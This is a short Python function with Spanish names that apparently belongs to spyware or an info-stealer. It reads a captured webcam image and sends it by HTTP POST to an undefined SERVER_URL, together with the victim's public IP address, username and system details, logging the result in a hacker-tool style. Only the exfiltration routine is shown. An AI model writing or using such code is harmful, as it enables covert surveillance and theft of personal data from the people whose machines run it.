def enviar_al_servidor(info, archivos):
    try:
        with open(archivos["webcam"], "rb") as img:
            files = {
                "image": img,
                "ip": (None, info["ip_publica"]),
                "username": (None, info["usuario"]),
                "system_info": (None, json.dumps(info)),
            }
            response = requests.post(SERVER_URL, files=files)
            print("[+] Enviado al servidor:", response.status_code)
    except Exception as e:
        print(f"[!] Error enviando datos: {e}")

